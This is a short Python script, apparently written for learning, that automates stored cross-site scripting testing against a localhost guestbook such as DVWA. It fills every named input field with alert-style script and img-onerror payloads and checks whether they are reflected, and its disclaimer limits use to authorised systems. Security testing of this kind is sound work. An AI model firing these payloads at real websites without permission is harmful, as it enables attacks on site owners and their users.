# hey it s Ricci here, this is a cross site scripting automated tester
# we get a full page parse everythings and only get the input fields to test
# using beautifulsoup to parse the html
# this script is  inspired by the Python Web Penetration Testing Cookbook
#
# DISCLAIMER: This tool is for educational purposes only.
# Only use on systems you own or have explicit permission to test.
# Unauthorized access to computer systems is illegal.
# it s better to do it manually with burpsuite , OWASP ZAP or in the browsers but here is a simple automated version


import requests
from bs4 import BeautifulSoup, SoupStrainer

# url is the page with the parameters to attack, url2 is the page that the content
# is going to be submitted to, and url3 is the final page to be read in order to detect whether
# the attack was successful
# u need to have some server running with a guestbook that is vulnerable to xss
# for example you can use DVWA or you can create your own with some php and mysql
# gambaree gambaree(courage courage)
url = "http://127.0.0.1/xss/medium/guestbook2.php"
url2 = "http://127.0.0.1/xss/medium/addguestbook2.php"
url3 = "http://127.0.0.1/xss/medium/viewguestbook2.php"


payloads = ['<script>alert("XSS here")</script>', '<img src=x onerror=alert("XSS")>']
initial = requests.get(url)
for payload in payloads:
    d = {}
    beatifulInput = BeautifulSoup(initial.text, parse_only=SoupStrainer("input"))
    for field in beatifulInput:
        # not targeting submit buttons
        if field.has_attr("name"):
            if field["name"].lower() == "submit":
                d[field["name"]] = "submit"
            else:
                d[field["name"]] = payload
    post = requests.post(url2, data=d)
    final = requests.get(url3)
    if payload in final.text:
        # print something if vulnerable
        print("[+] Vulnerable to Cross-Site Scripting (XSS)!")
        print("[+] Payload found in response: " + payload)
    else:
        print("[-] Not vulnerable with payload: " + payload)
